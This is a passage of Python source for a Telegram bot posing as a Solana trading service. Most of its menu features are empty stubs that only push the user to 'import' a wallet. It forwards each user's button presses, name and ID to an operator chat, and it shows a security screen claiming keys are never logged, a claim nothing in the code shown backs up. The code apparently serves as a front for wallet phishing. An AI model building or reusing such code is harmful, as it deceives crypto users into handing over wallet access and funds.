            await query.edit_message_text("📊 Positions\n\nWallet: `" + w["pubkey"] + "`\n\nYou have no open positions.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "limits":
        await query.edit_message_text("📉 Limits\n\nPlease connect your wallet first to set limit orders.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "dca":
        await query.edit_message_text("You have no active DCA orders. Create a DCA order from the Buy/Sell menu.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "trending":
        await query.edit_message_text("🔥 Fetching trending tokens... Please wait.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        try:
            msg = await get_trending_message()
            await query.edit_message_text(
                msg, parse_mode="Markdown",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh Trending", callback_data="trending")],
                    [InlineKeyboardButton("🛒 Buy Token",        callback_data="buy")],
                    [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        except Exception:
            await query.edit_message_text("Could not fetch trending data. Please try again.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Try Again", callback_data="trending")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "boosted":
        await query.edit_message_text("🚀 Boosted Tokens\n\nThese tokens are currently boosted.\nConnect your wallet to buy boosted tokens.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "top_boost":
        await query.edit_message_text("📈 Top Boost\n\nThese are the top boosted tokens.\nConnect your wallet to start trading.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "profiles":
        await query.edit_message_text("⭐ Profiles\n\nManage your trading profiles here.\nConnect your wallet to view and manage profiles.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "search":
        await query.edit_message_text("🔍 Token Search\n\nPlease enter a token symbol, name, or contract address to search:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "charts":
        await query.edit_message_text("📊 Charts\n\nView live token charts here.\nConnect your wallet to trade directly from charts.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "launch":
        await query.edit_message_text("🎉 Launch Token\n\nLaunch your own token here.\nConnect your wallet to get started.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "pnls":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text(
                "📈 PNLs\n\nPlease connect your wallet first to view your PNLs.\n\nClick Connect Wallet to import your wallet.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")],
                    [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ]),
            )
        else:
            await query.edit_message_text(
                "📈 Generating your PNL report...\nFetching trade history, please wait.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
            )
            try:
                img_buf, pnl_data = await generate_pnl_image(w["pubkey"], w["balance"])
                pnl_buttons = InlineKeyboardMarkup([
                    [InlineKeyboardButton("🔄 Refresh PNL", callback_data="pnls")],
                    [InlineKeyboardButton("🛒 Buy",         callback_data="buy"),
                     InlineKeyboardButton("💰 Sell",        callback_data="sell")],
                    [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                ])
                if img_buf:
                    total = pnl_data["total_pnl"] if pnl_data else 0
                    sign  = "+" if total >= 0 else ""
                    caption = (
                        "📈 Your PNL Report\n\n"
                        "Wallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\n"
                        "Total PNL: `" + sign + str(total) + " SOL`\n"
                        "Balance: `" + str(round(w["balance"], 4)) + " SOL`"
                    )
                    await query.message.reply_photo(
                        photo=img_buf,
                        caption=caption,
                        parse_mode="Markdown",
                        reply_markup=pnl_buttons,
                    )
                    await query.delete_message()
                else:
                    await query.edit_message_text(
                        "📈 PNLs\n\nYou haven't traded with MetaSolana.\nKindly trade to view your PNLs.",
                        reply_markup=pnl_buttons,
                    )
            except Exception as exc:
                logger.warning("PNL error: %s", exc)
                await query.edit_message_text(
                    "📈 PNLs\n\nYou haven't traded with MetaSolana.\nKindly trade to view your PNLs.",
                    reply_markup=InlineKeyboardMarkup([
                        [InlineKeyboardButton("🛒 Buy", callback_data="buy")],
                        [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
                    ]),
                )

    elif data == "sniper":
        await query.edit_message_text(SNIPER_V2_TEXT, reply_markup=sniper_keyboard())

    elif data == "auto_sniper":
        await query.edit_message_text(
            "⚡ Auto Sniper\n\nSet your custom parameters and Auto Snipe any launch on Solana.\n\nPlease enter the token contract address or launch details to snipe:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="sniper"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "migration_sniper":
        await query.edit_message_text(
            "🔀 Migration Sniper\n\nSnipe tokens and pumpfun migrations when they launch on Raydium.\n\nPlease enter the token contract address to watch for migration:",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="sniper"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]),
        )

    elif data == "refer":
        await query.edit_message_text("👥 Refer & Earn\n\nRefer friends and earn rewards.\nConnect your wallet to get your referral link.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "wallet":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("🔗 Wallet\n\nNo wallet connected.\nClick Connect Wallet to import your wallet.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        else:
            await query.edit_message_text("🔗 Wallet\n\nYour wallet address:\nSolana:\n`" + w["pubkey"] + "`\nBal: `" + str(w["balance"]) + " SOL`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔄 Refresh", callback_data="refresh")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "buy_trending":
        await query.edit_message_text("🌐 Buy Trending\n\nBuy the top trending tokens with one click.\nConnect your wallet to start.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "volume_booster":
        await query.edit_message_text("📊 Volume Booster\n\nBoost your token volume here.\nConnect your wallet to activate.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "add_liquidity":
        await query.edit_message_text("💧 Add Liquidity\n\nAdd liquidity to a token pool.\nConnect your wallet to continue.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "bridge":
        await query.edit_message_text("🌉 Bridge\n\nBridge your tokens across chains.\nConnect your wallet to use the bridge.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "copy":
        w      = get_wallet(uid)
        pubkey = w["pubkey"] if w else "Not connected"
        await query.edit_message_text("Copy Trade\nWallet: " + pubkey + " — W1\n\nCopy Trade allows you to copy the buys and sells of any target wallet.\n🟢 Indicates a copy trade setup is active.\n🟠 Indicates a copy trade setup is paused.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("➕ New Copy Trade", callback_data="new_copy_trade")], [InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "new_copy_trade":
        await query.edit_message_text("➕ New Copy Trade\n\nPlease enter the wallet address you want to copy trade:\n\nExample:\n`HkaS8KMyg9gUM937QF8x9Pb1s13S3uk9aFGFWguhBpAb`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="copy"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "withdraw":
        await query.edit_message_text("💸 Withdraw\n\nWithdraw your funds to an external wallet.\nConnect your wallet to make a withdrawal.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "copy_wallet":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("📋 Copy Wallet\n\nNo wallet connected.\nConnect your wallet first to see your address.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        else:
            await query.edit_message_text("📋 Copy Wallet\n\nYour wallet address:\n`" + w["pubkey"] + "`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "auto_trade":
        await query.edit_message_text("🤖 Auto Trade-Pumpfun\n\nAutomatically trade tokens on Pumpfun.\nConnect your wallet to activate.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "help":
        await query.edit_message_text("❓ Help\n\nWelcome to the Help Center.\n\nHow to get started:\n1. Connect your wallet\n2. Fund your wallet with SOL\n3. Use Buy to purchase tokens\n4. Use Sell to sell tokens\n\nFor support contact: @support", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    # ── NEW BUTTON HANDLERS ──────────────────────
    elif data == "trades":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("🎮 Trades\n\nPlease connect your wallet first to view your trade history.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        else:
            await query.edit_message_text("🎮 Trades\n\nWallet: `" + w["pubkey"][:8] + "..." + w["pubkey"][-8:] + "`\n\nYou have no recent trades.", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛒 Buy", callback_data="buy"), InlineKeyboardButton("💰 Sell", callback_data="sell")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "cashback":
        await query.edit_message_text("💰 Cashback\n\nEarn cashback on every trade you make.\nConnect your wallet to activate cashback rewards.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "transfer_sol":
        w = get_wallet(uid)
        if not w:
            await query.edit_message_text("🗃 Transfer SOL\n\nPlease connect your wallet first to transfer SOL.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))
        else:
            context.user_data["expecting"] = "transfer_sol"
            await query.edit_message_text("🗃 Transfer SOL\n\nPlease enter the recipient wallet address and amount (e.g. `Address Amount`):", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "settings":
        await query.edit_message_text("🔧 Settings\n\nBot settings:\n- Slippage: 1%\n- Auto-approve: Off\n- MEV Protection: On\n\nSelect an option to change:", reply_markup=InlineKeyboardMarkup([
            [InlineKeyboardButton("📊 Slippage", callback_data="set_slippage")],
            [InlineKeyboardButton("✅ Auto-Approve", callback_data="set_auto_approve")],
            [InlineKeyboardButton("🛡 MEV Protection", callback_data="set_mev")],
            [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")],
        ]))

    elif data == "stbot_token":
        await query.edit_message_text("🔥 Our STBOT Token\n\nLearn more about our native token.\n\nContract: `Coming Soon`", parse_mode="Markdown", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🌐 Website", url="https://metatrading.com")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "market_maker":
        await query.edit_message_text("🚀 Market Maker\n\nBoost your token volume and liquidity.\nConnect your wallet to activate market making.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔗 Connect Wallet", callback_data="connect_wallet")], [InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "backup_bots":
        await query.edit_message_text("🤖 Backup Bots\n\nOur backup bot list:\n1. @MetaTradingBot2\n2. @MetaTradingBot3\n\nAdd them as backup in case this bot is down.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "security":
        await query.edit_message_text("🛡 Security\n\nYour wallet data is encrypted and stored securely.\n- Private keys are never logged\n- All transactions are signed locally\n- Session expires after 24h of inactivity", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "tutorials":
        await query.edit_message_text("📑 Tutorials\n\n1. How to connect your wallet\n2. How to buy a token\n3. How to sell a token\n4. How to use limit orders\n5. How to copy trade\n\nMore tutorials coming soon!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("⬅ Back", callback_data="main_menu"), InlineKeyboardButton("🏠 Main Menu", callback_data="main_menu")]]))

    elif data == "close":
        await query.delete_message()
        return

    elif data in ["lang_en", "lang_zh", "lang_ru", "lang_pt", "lang_vi"]:
        lang_map = {"lang_en": "English 🇺🇸", "lang_zh": "中文 🇨🇳", "lang_ru": "Русский 🇷🇺", "lang_pt": "Português 🇧🇷", "lang_vi": "Tiếng Việt 🇻🇳"}
        await query.answer("Language set to " + lang_map.get(data, "English") + "!", show_alert=True)

    elif data == "new_sniper":
        await query.edit_message_text(NEW_SNIPER_TEXT, reply_markup=new_sniper_keyboard())

    elif data == "listing_header":
        await query.answer("Filter your sniper listings", show_alert=False)

    elif data == "targeted_sniper":
        await query.edit_message_text(
            "⭐ Targeted Sniper\n\nPlease enter your snipe parameters in this format:\n"
            "`DevWallet | TokenSymbol | TokenAddress`\n\n"
            "All fields are optional. Leave blank for any.",
            parse_mode="Markdown",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")]]),
        )

    elif data == "mass_sniper":
        await query.edit_message_text(
            "🌟 Mass Sniper\n\nYou are about to enable mass sniping mode.\n"
            "This will snipe ALL tokens on your selected DEXs without validation.\n\n"
            "⚠️ High risk — use with caution!\n\n"
            "Select your DEXs to continue:",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("Raydium", callback_data="mass_raydium"),
                 InlineKeyboardButton("Orca", callback_data="mass_orca")],
                [InlineKeyboardButton("Pumpfun", callback_data="mass_pumpfun")],
                [InlineKeyboardButton("🏠 Back Sniper Home", callback_data="sniper")],
            ]),
        )

    elif data == "sniper_all":
        await query.edit_message_text("🎯 Sniper V2 — All Listings\n\nShowing all sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_active":
        await query.edit_message_text("🎯 Sniper V2 — Active\n\nShowing active sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_inactive":
        await query.edit_message_text("🎯 Sniper V2 — Inactive\n\nShowing inactive sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_completed":
        await query.edit_message_text("🎯 Sniper V2 — Completed\n\nShowing completed sniper jobs...", reply_markup=sniper_keyboard())

    elif data == "sniper_doc":
        await query.answer("Documentation coming soon!", show_alert=True)

    if FORWARD_CHAT_ID and data not in ["main_menu", "refresh"]:
        try:
            name = ("@" + user.username) if user and user.username else str(user.full_name)
            await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text="Button pressed\nUser: " + name + "\nID: " + str(uid) + "\nButton: " + data)
        except Exception as exc:
            logger.warning("Could not log button press: %s", exc)


# ── Daily stats ───────────────────────────────
async def send_daily_stats(context: ContextTypes.DEFAULT_TYPE):
    if not FORWARD_CHAT_ID:
        return
    try:
        s = get_stats()
        lines = ["Daily Statistics Report", "Date: " + datetime.utcnow().strftime("%Y-%m-%d"), "Total: " + str(s["total"]), "Today: " + str(s["today"]), "Users: " + str(s["unique_users"]), "", "By type:"]
        for mtype, count in s["by_type"]:
            lines.append("  " + str(mtype) + ": " + str(count))
        await context.bot.send_message(chat_id=FORWARD_CHAT_ID, text="\n".join(lines))
    except Exception as exc:
        logger.warning("Could not send daily stats: %s", exc)


# ── Entry point ───────────────────────────────
async def main():
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start",       cmd_start))
    app.add_handler(CommandHandler("buy",         cmd_buy))
    app.add_handler(CommandHandler("sell",        cmd_sell))
    app.add_handler(CommandHandler("positions",   cmd_positions))
    app.add_handler(CommandHandler("limits",      cmd_limits))
    app.add_handler(CommandHandler("dca",         cmd_dca))
    app.add_handler(CommandHandler("trending",    cmd_trending))
    app.add_handler(CommandHandler("boosted",     cmd_boosted))
    app.add_handler(CommandHandler("topboost",    cmd_topboost))
    app.add_handler(CommandHandler("profiles",    cmd_profiles))
    app.add_handler(CommandHandler("search",      cmd_search))
    app.add_handler(CommandHandler("charts",      cmd_charts))
    app.add_handler(CommandHandler("launch",      cmd_launch))
    app.add_handler(CommandHandler("pnls",        cmd_pnls))
    app.add_handler(CommandHandler("sniper",      cmd_sniper))
    app.add_handler(CommandHandler("refer",       cmd_refer))
    app.add_handler(CommandHandler("wallet",      cmd_wallet))
    app.add_handler(CommandHandler("buytrending", cmd_buytrending))
    app.add_handler(CommandHandler("volume",      cmd_volume))
    app.add_handler(CommandHandler("liquidity",   cmd_liquidity))
    app.add_handler(CommandHandler("bridge",      cmd_bridge))
    app.add_handler(CommandHandler("copy",        cmd_copy))
    app.add_handler(CommandHandler("withdraw",    cmd_withdraw))
    app.add_handler(CommandHandler("copywallet",  cmd_copywallet))
    app.add_handler(CommandHandler("autotrade",   cmd_autotrade))
    app.add_handler(CommandHandler("help",        cmd_help))
    app.add_handler(CommandHandler("myid",        cmd_myid))
    app.add_handler(CommandHandler("stats",       cmd_stats))
    app.add_handler(CommandHandler("allow",       cmd_allow))
    app.add_handler(CommandHandler("block",       cmd_block))
    app.add_handler(CommandHandler("unfilter",    cmd_unfilter))
    app.add_handler(CommandHandler("listusers",   cmd_listusers))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(MessageHandler(filters.PHOTO,        handle_photo))
    app.add_handler(MessageHandler(filters.VIDEO,        handle_video))
    app.add_handler(MessageHandler(filters.AUDIO,        handle_audio))
    app.add_handler(MessageHandler(filters.VOICE,        handle_voice))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.Sticker.ALL,  handle_sticker))

    job_queue = app.job_queue
    if job_queue:
        job_queue.run_daily(send_daily_stats, time=dtime(hour=8, minute=0))

    logger.info("Bot is running. Press Ctrl+C to stop.")
    async with app:
        await app.initialize()
        await app.bot.set_my_commands([
            BotCommand("start",       "Trade on Solana with Meta Bot"),
            BotCommand("buy",         "Buy a token"),
            BotCommand("sell",        "Sell a token"),
            BotCommand("positions",   "View your positions"),
            BotCommand("limits",      "Set limit orders"),
            BotCommand("dca",         "Dollar cost averaging"),
            BotCommand("trending",    "View trending tokens"),
            BotCommand("boosted",     "View boosted tokens"),
            BotCommand("topboost",    "View top boosted tokens"),
            BotCommand("profiles",    "Manage trading profiles"),
            BotCommand("search",      "Search for a token"),
            BotCommand("charts",      "View token charts"),
            BotCommand("launch",      "Launch a token"),
            BotCommand("pnls",        "View your PNLs"),
            BotCommand("sniper",      "Snipe token launches"),
            BotCommand("refer",       "Refer and earn rewards"),
            BotCommand("wallet",      "Manage your wallet"),
            BotCommand("buytrending", "Buy trending tokens"),
            BotCommand("volume",      "Volume booster"),
            BotCommand("liquidity",   "Add liquidity"),
            BotCommand("bridge",      "Bridge tokens"),
            BotCommand("copy",        "Copy trading"),
            BotCommand("withdraw",    "Withdraw funds"),
            BotCommand("copywallet",  "Copy wallet address"),
            BotCommand("autotrade",   "Auto trade on Pumpfun"),
            BotCommand("help",        "Get help"),
            BotCommand("myid",        "Your Telegram user ID"),
            BotCommand("stats",       "Message statistics"),
        ])
        await app.start()
        await app.updater.start_polling()
        await asyncio.Event().wait()


if __name__ == "__main__":
    asyncio.run(main())
